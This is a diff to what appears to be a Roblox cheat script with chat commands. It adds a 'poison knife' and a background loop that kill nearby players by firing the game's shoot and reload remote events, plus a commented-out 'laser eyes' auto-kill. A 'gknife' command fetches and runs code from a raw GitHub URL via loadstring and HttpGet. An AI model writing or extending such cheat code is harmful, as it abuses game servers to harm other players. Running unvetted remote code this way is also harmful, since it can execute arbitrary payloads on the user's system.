@@ -735,6 +735,7 @@ local Loops = {
 	};
 	Plague = {};
 	Cure = {};
+	Poison = {};
 };
 local Powers = {
 	Killauras = {};
@@ -748,6 +749,7 @@ local Powers = {
 	Oneshot = {};
 	FriendlyFire = {};
 	DeathNuke = {};
+	LaserEyes = {};
 };
 local Settings = {
 	KillauraThreshold = 17;
@@ -827,11 +829,11 @@ local waitfor = function(source, args, interval)
 end
 
 local function isPermAdmin(userId)
-	print("checking if perm admin")
+	--print("checking if perm admin")
 	for _, id in ipairs(permAdmin) do
-		print("theres an id")
+		--print("theres an id")
 		if tonumber(id) == tonumber(userId) then
-			print("yup perm admin")
+			--print("yup perm admin")
 			return true
 		end
 	end
@@ -1393,7 +1395,7 @@ local SpawnClientStuff = function(arg)
 		handle.Name = "Handle"
 		handle.Size = Vector3.new(0.4, 4, 0.4)
 		local animate = Instance.new("Animation", tool)
-		animate.AnimationId = "rbxassetid://218504594"
+		animate.AnimationId = "rbxassetid://218504594" 
 		local animtrack = LocalPlayer.Character.Humanoid:LoadAnimation(animate)
 		local attacking = false
 		local activate = tool.Activated:Connect(function()
@@ -1453,6 +1455,43 @@ local SpawnClientStuff = function(arg)
 		scriptt.BinType = "Script"
 		grab.BinType = "Grab"
 		clonee.BinType = "Clone"
+	elseif arg == "poisonknife" then
+		ItemHand(false, "Crude Knife")
+		local knife = LocalPlayer.Backpack:FindFirstChild("Crude Knife") or LocalPlayer.Character:FindFirstChild("Crude Knife")
+		local attacking = false
+		local inPutCon = game:GetService("UserInputService").InputBegan:Connect(function(input)
+			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+				if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Crude Knife") then
+					if not attacking then
+						attacking = true
+						animtrack:Play()
+						for i,v in pairs(Players:GetPlayers()) do
+							if not (v == LocalPlayer) then
+								if v.Character and v.Character:FindFirstChild("Humanoid") then
+									if not (v.Character:FindFirstChild("Humanoid").Health == 0) then
+										local LPart, VPart = LocalPlayer.Character.PrimaryPart, v.Character.PrimaryPart
+										if LPart and VPart then
+											if (LPart.Position-VPart.Position).Magnitude <= 5 then
+												for i = 1, 15 do
+													Loops.Poison[v.UserId] = v
+												end
+											end
+										end
+									end
+								end
+							end
+						end
+						task.wait(.1)
+						attacking = false
+					end
+				end
+			end
+		end)
+		task.spawn(function()
+			LocalPlayer.CharacterAdded:Wait()
+			inPutCon:Disconnect(); animate:Destroy()
+			animate = nil; animtrack = nil; inPutCon = nil
+		end)
 	end
 end
 
@@ -3968,14 +4007,14 @@ local OnCommand = function(text, whoran)
 	end
 	if not (Args[1]:sub(1, #Prefix) == Prefix or Args[1]:sub(1, #permAdminPrefix) == permAdminPrefix) then
 	chatdebounce = nil
-	print("boing")
+	--print("boing")
 	return
 end
 	local function cm(args)
 		if whoran == nil then
 			return args == Args[1]:sub(#Prefix+1):lower()
 		else
-			print("i dont think so")
+			--print("i dont think so")
 			return args == Args[1]:sub(#permAdminPrefix+1):lower()
 		end
 	end
@@ -4256,6 +4295,14 @@ end
 			end
 		end
 	end
+	elseif cm("lasereyes") then
+		Powers.LaserEyes[LocalPlayer.UserId] = LocalPlayer
+	elseif cm("poisonknife") or cm("pknife") then
+		SpawnClientStuff("poisonknife")
+	elseif cm("gknife") then
+		task.spawn(function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/JJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJ123/roblox/main/elpme,elpme,elpme(not by me)", true))()
+		end)
 	elseif cm("goto") or cm("to") then
 		local DaPlayer = PlrFromArgs(Args[2], false)
 		if DaPlayer then
@@ -9747,7 +9794,7 @@ task.spawn(function() -- crashes?
 			end
 		end
 	end)]]
-
+-- plague v2 babyyyy (its by ai cuz i didnt wanna do theese optimizations)
 task.spawn(function()
     local ThreadedOmgEpic = {}
 
@@ -9809,6 +9856,55 @@ task.spawn(function()
         end
     end
 end)
+task.spawn(function()
+	while true do
+		task.wait(0.1)
+		for _, v in pairs(Players:GetPlayers()) do
+			if workspace:FindFirstChild(v.Name) then
+					task.wait(0.1)
+					local char = workspace:FindFirstChild(v.Name)
+					local hum = char and char:FindFirstChild("Humanoid")
+					local wep = LocalPlayer.Backpack:FindFirstChild("M9")
+					if Loops.Poison[v.UserId] then
+						print("im currently attempting to killpl")
+						Gun("AK-47")
+						if wep then
+							KillPL(v, 1, "AK-47")
+						end
+					end
+				end
+			end
+		end
+end)
+
+--[[ LaserEyes
+task.spawn(function()
+	while true do
+		wait(1)
+		for _, v in pairs(Powers.LaserEyes) do
+			local origin = v.Character.Head.Position -- starting point
+			local direction = Vector3.new(0, 0, -100) -- cast 100 studs forward
+			dist = 100
+
+			local raycastParams = RaycastParams.new()
+			raycastParams.FilterDescendantsInstances = {} -- optional filters
+			raycastParams.IgnoreWater = true
+
+			local result = workspace:Raycast(origin, direction, raycastParams)
+
+			if result then
+    			local p = game.Players:GetPlayerFromCharacter(result.Instance:FindFirstAncestorOfClass("Model"))
+				dist = (v.Character.Head.Position - LocalPlayer.Character.Head.Position).Magnitude
+    			if p then KillPL(p, 2, "AK-47") end
+			else
+    			print("No hit within 100 studs")
+			end
+			Gun("AK-47")
+			local crabrave={[1]={CFrame=v.Character.Head.CFrame * CFrame.new(0, 0.25, (-1 * dist / 2)), Distance=dist,RayObject=Ray.new()}}
+			Rstorage.ShootEvent:FireServer(crabrave,"AK-47");Rstorage.ReloadEvent:FireServer("AK-47");CreateClientRay(crabrave)
+		end
+	end
+end)]]
 
 --Killauras and antitouch
 task.spawn(function()
